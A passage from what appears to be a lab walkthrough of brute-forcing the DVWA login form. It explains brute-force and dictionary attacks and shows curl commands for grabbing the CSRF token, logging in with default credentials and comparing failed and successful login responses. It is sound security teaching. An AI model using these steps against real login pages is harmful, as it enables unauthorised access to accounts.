&lt;li&gt;The values used &amp;amp; the order of them, all &lt;strong&gt;depends on how the attacker&lt;/strong&gt; performs the attack.&lt;/li&gt;
&lt;li&gt;A brute force attack will cover everything in its range; however, it will take longer than a dictionary attack based on the total amount of combinations.&lt;/li&gt;
&lt;li&gt;A dictionary attack will use the pre-compiled values. However, there are values tools out there to &lt;strong&gt;"mangle" the wordlist&lt;/strong&gt; in various ways, allowing for more possibilities and total combinations. An example: &lt;code&gt;password&lt;/code&gt; -&gt; &lt;code&gt;password1999&lt;/code&gt; (year at the end). &lt;code&gt;password&lt;/code&gt; -&gt; &lt;code&gt;p@$$w0rd&lt;/code&gt; (1337 speak). The original value (&lt;code&gt;password&lt;/code&gt;) is called "base word".&lt;/li&gt;
&lt;li&gt;The best wordlist to use is one customized to the target. When using general wordlists, check for:

&lt;ul&gt;
&lt;li&gt;Leading/trailing spaces/tabs - &lt;code&gt;^ password$&lt;/code&gt;, &lt;code&gt;^password$&lt;/code&gt;, &lt;code&gt;^password $&lt;/code&gt;  &lt;em&gt;(forgive the regular expressions!)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Duplicated entries (case sensitive!) - &lt;code&gt;password&lt;/code&gt;, &lt;code&gt;farm&lt;/code&gt;, &lt;code&gt;PASSWORD&lt;/code&gt;, &lt;code&gt;mouse&lt;/code&gt;, &lt;code&gt;password&lt;/code&gt;, &lt;code&gt;horse&lt;/code&gt;, &lt;code&gt;Password&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;The ordering of the list - &lt;code&gt;common_password&lt;/code&gt;, &lt;code&gt;uncommon_password&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;If it is just base words - &lt;code&gt;password&lt;/code&gt;, &lt;code&gt;password99&lt;/code&gt;, &lt;code&gt;password1999&lt;/code&gt;, &lt;code&gt;p@55w0rd&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;The language - &lt;code&gt;password&lt;/code&gt;, &lt;code&gt;motdepasse&lt;/code&gt;, &lt;code&gt;passwort&lt;/code&gt;, &lt;code&gt;clave&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;In a brute force attack, &lt;strong&gt;multiple wordlists could be used&lt;/strong&gt;. Example: one for the password, one for the username. The attacker may loop through all the passwords, before trying the next username or vice versa. Alternatively, the username and password lists may be increased at the same time.&lt;/li&gt;
&lt;li&gt;An &lt;strong&gt;online attack refers to the attack being a network service&lt;/strong&gt;, on a machine which is not the attacker's (aka a "remote machine"). An &lt;strong&gt;offline attack would be local to the attacker's machine&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;A brute force attack &lt;strong&gt;speed runs at the slowest point&lt;/strong&gt;. If it is an online attack, this is often the network connection, whereas, offline is commonly the CPU/GPU speed. Offline attacks are normally much quicker than online ones.&lt;/li&gt;
&lt;li&gt;There are various ways to speed up brute force attacks, normally by increasing threads. This is how many tasks/requests are performed at once. Not using enough, means there could be additional performance gained as not all the resources are being used. However, using too many will overload causing, it to perform slower or to miss a successful attempt.&lt;/li&gt;
&lt;/ul&gt;


&lt;hr /&gt;

&lt;a name="Creating.a.Session.Cookie"&gt;&lt;/a&gt;
&lt;h2&gt;Creating a Session Cookie&lt;/h2&gt;

&lt;p&gt;To get the web form that we want to brute force (&lt;code&gt;http://192.168.1.44/DVWA/vulnerabilities/brute/&lt;/code&gt;), we must already be logged in. &lt;em&gt;This in itself is a bit of an odd thing to-do as most of the time, you would not be authenticated hence the brute forcing...&lt;/em&gt; Anyway, as we are going to be using a lot of command line tools, we need to create an active and valid session to interact with DVWA. &lt;strong&gt;Normally, you would not have to-do this. This is just for DVWA&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;I'm going to be re-running these commands often, however, this is overkill. This is because it will make it easier for people who are copying/pasting or stop/starting a lot (hence their session times out) or people jumping around the page (skipping sections out). &lt;strong&gt;As long as the &lt;code&gt;admin&lt;/code&gt;'s password has not been changed from the default value (&lt;code&gt;password&lt;/code&gt;), this will work&lt;/strong&gt; &lt;em&gt;(depending on your target's IP address)&lt;/em&gt;.&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# CSRF=$(curl -s -c dvwa.cookie 'http://192.168.1.44/DVWA/login.php' | awk -F 'value=' '/user_token/ {print $2}' | cut -d &amp;quot;'&amp;quot; -f2)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b dvwa.cookie --data &amp;quot;username=admin&amp;amp;password=password&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot; &amp;quot;http://192.168.1.44/DVWA/login.php&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Document Moved&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;Object Moved&amp;lt;/h1&amp;gt;This document may be found &amp;lt;a &lt;span class="nv"&gt;HREF&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;index.php&amp;quot;&lt;/span&gt;&amp;gt;here&amp;lt;/a&amp;gt;&amp;lt;/body&amp;gt;#
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# sed -i '/security/d' dvwa.cookie&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Create Session Cookie" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-01.png" /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Note, depending on the web server &amp;amp; its configuration, &lt;a href="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-02.png"&gt;it may respond slightly differently&lt;/a&gt; (in the &lt;a href="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-02.png"&gt;screenshot&lt;/a&gt;: &lt;code&gt;192.168.1.11&lt;/code&gt; is &lt;strong&gt;Nginx&lt;/strong&gt;,&lt;code&gt;192.168.1.22&lt;/code&gt; is &lt;strong&gt;Apache&lt;/strong&gt; &amp;amp; &lt;code&gt;192.168.1.44&lt;/code&gt; is &lt;strong&gt;IIS&lt;/strong&gt;). This is a possible method to fingerprint an IIS web server.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The first line &lt;strong&gt;grabs the "Anti Cross-Site Request Forgery (CSRF)" token&lt;/strong&gt; (&lt;a href="https://blog.g0tmi1k.com/dvwa/login/"&gt;as explained when brute forcing the main login page&lt;/a&gt;), and extracts the  &lt;code&gt;user_token&lt;/code&gt; field) which will be a unique value each time and paired to the session ID.
We then send a request that would be the same as &lt;strong&gt;filling in the form with the user credentials&lt;/strong&gt; (again, see the main login page being brute forced to see how this was constructed), using the same cookie which was set from our first request.
Lastly we &lt;strong&gt;remove the security level&lt;/strong&gt; from the cookie value. As this would be a "static" value, and ideally we want it to be "dynamic" (so we can change the level based in our request).&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Information.Gathering"&gt;&lt;/a&gt;
&lt;h2&gt;Information Gathering&lt;/h2&gt;

&lt;p&gt;If this was a "real world" scenario, we would clone the target's production setup as best we could (e.g. find if it is using "off the shelf" software, web server information, what versions etc.) and clone it into a test lab. This means we could fully control the web application, allowing us to understand it better. For example, we could create a user on the system and watch how the program responses with a successful login, rather than just guessing and hoping.&lt;/p&gt;

&lt;p&gt;However, we will take a slightly different approach as this shows why doing information gathering as you go along is important as well using different techniques and methods.&lt;/p&gt;

&lt;a name="Form.HTML.Code"&gt;&lt;/a&gt;
&lt;h3&gt;Form HTML Code&lt;/h3&gt;

&lt;p&gt;The first thing we want to-do is to see what we are going up against. Same idea as before; let's see the returned HTML code. This is done by using &lt;code&gt;sed&lt;/code&gt; to extract between the HTML tags we want (known ahead of time).&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b 'security=low' -b dvwa.cookie 'http://192.168.1.44/DVWA/vulnerabilities/brute/' | sed -n '/&amp;lt;div class=&amp;quot;body_padded/,/&amp;lt;\/div/p'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt; div &lt;span class="nv"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;body_padded&amp;quot;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;  &amp;lt;h1&amp;gt;Vulnerability: Brute Force&amp;lt;/h1&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &amp;lt;div &lt;span class="nv"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;vulnerable_code_area&amp;quot;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;    &amp;lt;h2&amp;gt;Login&amp;lt;/h2&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &amp;lt;form &lt;span class="nv"&gt;action&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;#&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;method&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;GET&amp;quot;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;      Username:&amp;lt;br /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;      &amp;lt;input &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;text&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&amp;gt;&amp;lt;br /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;      Password:&amp;lt;br /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;      &amp;lt;input &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;AUTOCOMPLETE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;off&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&amp;gt;&amp;lt;br /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;      &amp;lt;br /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;      &amp;lt;input &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;submit&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Login&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Login&amp;quot;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &amp;lt;/form&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;        &amp;lt;div &lt;span class="nv"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;body_padded&amp;quot;&lt;/span&gt;&amp;gt;&amp;lt;div &lt;span class="nv"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;&amp;gt;You have logged in as &lt;span class="s1"&gt;'admin'&lt;/span&gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;      &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Form HTML Code" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-03.png" /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sed -n '/&amp;lt;div class="body_padded/,/&amp;lt;\/div/p'&lt;/code&gt; extracts everything between &lt;code&gt;&amp;lt;div class="body_padded&lt;/code&gt; and its matching &lt;code&gt;&amp;lt;/div&lt;/code&gt;. I knew to use these values as I had looked at the complete page output beforehand, the HTML output is far too long, hence why &lt;code&gt;sed&lt;/code&gt; is used to snip out the necessary lines!&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sed -n '/&amp;lt;form/,/&amp;lt;\/form/p'&lt;/code&gt; is then done as this is everything which would be sent in the request when trying to login.&lt;/li&gt;
&lt;/ul&gt;


&lt;hr /&gt;

&lt;a name="Generating.a.Baseline"&gt;&lt;/a&gt;
&lt;h3&gt;Generating a Baseline&lt;/h3&gt;

&lt;p&gt;Now we are going to create a "baseline" which is a request before we try to login (&lt;code&gt;before.txt&lt;/code&gt;), and then make another request made afterwards using an incorrect login attempt (&lt;code&gt;after.txt&lt;/code&gt;). The last step would be to compare the differences between them. This way we can see how the web app responds and start to get a feel of how it works.&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b 'security=low' -b dvwa.cookie -i 'http://192.168.1.44/DVWA/vulnerabilities/brute/' &amp;gt; before.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b 'security=low' -b dvwa.cookie -i 'http://192.168.1.44/DVWA/vulnerabilities/brute/?username=user&amp;amp;password=pass&amp;amp;Login=Login' &amp;gt; after.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# diff before.txt after.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;9c9
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt; Content-Length: 4980
&lt;/span&gt;&lt;span class="line"&gt;---
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Content-Length: 4945
&lt;/span&gt;&lt;span class="line"&gt;81c81
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;
&lt;/span&gt;&lt;span class="line"&gt;---
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt;     &amp;lt;pre&amp;gt;&amp;lt;br /&amp;gt;Username and/or password incorrect.&amp;lt;/pre&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;93c93
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;         &amp;lt;div &lt;span class="nv"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;body_padded&amp;quot;&lt;/span&gt;&amp;gt;&amp;lt;div &lt;span class="nv"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;&amp;gt;You have logged in as &lt;span class="s1"&gt;'admin'&lt;/span&gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;---
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;em&gt;Note, both requests were made within a second of each other, because of this there the time and date stamp are the same!&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Well this is not exactly what we were expecting! One request says the login is incorrect (&lt;code&gt;after.txt&lt;/code&gt;), the other (&lt;code&gt;before.txt&lt;/code&gt;) says we are logged in - yet we did not attempt to! A possible reason for this could because of the &lt;code&gt;cURL&lt;/code&gt; command before, logging us into the core DVWA rather than us using the brute force form. We can confirm our suspicions by making another baseline request.&lt;/p&gt;

&lt;p&gt;"Bash fu" alert, we can repeat the last cURL command (&lt;code&gt;!curl&lt;/code&gt;), and replace a value (&lt;code&gt;:gs/after/again/&lt;/code&gt;). People using ZSH shells will also find it will expand the command before executing it. Another tip, by using &lt;code&gt;before{,_again}.txt&lt;/code&gt; our shell will see it as &lt;code&gt;bash.txt before.txt before_again.txt&lt;/code&gt; which saves us typing a bit!&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b 'security=low' -b dvwa.cookie -i 'http://192.168.1.44/DVWA/vulnerabilities/brute/' &amp;gt; before.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# !curl:gs/before/before_again/   #curl -s -b 'security=low' -b dvwa.cookie -i 'http://192.168.1.44/DVWA/vulnerabilities/brute/' &amp;gt; before_again.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# diff before{,_again}.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;9c9
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt; Content-Length: 4980
&lt;/span&gt;&lt;span class="line"&gt;---
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Content-Length: 4893
&lt;/span&gt;&lt;span class="line"&gt;93c93
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;         &amp;lt;div &lt;span class="nv"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;body_padded&amp;quot;&lt;/span&gt;&amp;gt;&amp;lt;div &lt;span class="nv"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;&amp;gt;You have logged in as &lt;span class="s1"&gt;'admin'&lt;/span&gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;---
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Generating a Baseline" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-06.png" /&gt;&lt;/p&gt;

&lt;p&gt;Just as we thought, the &lt;code&gt;You have logged in as 'admin'&lt;/code&gt; message is the core DVWA response rather than the brute force module so we need to ignore this for the brute force module.&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Test.lab.vs.Production.target"&gt;&lt;/a&gt;
&lt;h3&gt;Test lab vs Production target&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;TL;DR&lt;/strong&gt;: In a test lab, you will have full administrative access. A production target, you may not even have an account to the system.&lt;/p&gt;

&lt;p&gt;Even though DVWA is a "test lab", we are treating it as a production target system. Because it is a &lt;strong&gt;"black box test"&lt;/strong&gt;, we have not been given credentials to login. The web application does not have a "sign up/register" page so &lt;strong&gt;we cannot create a user for ourselves&lt;/strong&gt;. We could try phish a user to get their login, however, this starts to go out of scope, as it is not really brute forcing.&lt;/p&gt;

&lt;p&gt;If DVWA was in a test lab (so we fully control the target, allowing us to created a user ourselves, meaning we know the values to use), or we knew of a valid account to login with on the production server (e.g. default user, demo account, or a given one in the scope of the pentest), we could find a "marker" to signal what happens when you log in (such as output on the page being redirected to a different page,  the page size being different, additional headers etc.).&lt;/p&gt;

&lt;p&gt;For demonstration purposes, I will show this. First cURL command will remove the unwanted text. The next request is a "failed" log in (&lt;code&gt;user:pass&lt;/code&gt;), the last is successful (&lt;code&gt;admin:password&lt;/code&gt;). By comparing the responses, we can see the page size is different (failed: &lt;code&gt;4945&lt;/code&gt;, success: &lt;code&gt;5007&lt;/code&gt;), as well as the HTML output (failed: &lt;code&gt;Username and/or password incorrect.&lt;/code&gt;, success: &lt;code&gt;Welcome to the password protected area&lt;/code&gt;).&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b 'security=low' -b dvwa.cookie -i 'http://192.168.1.44/DVWA/vulnerabilities/brute/' &amp;gt; /dev/null&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b 'security=low' -b dvwa.cookie -i 'http://192.168.1.44/DVWA/vulnerabilities/brute/?username=user&amp;amp;password=pass&amp;amp;Login=Login' &amp;gt; failed.txt&lt;/span&gt;
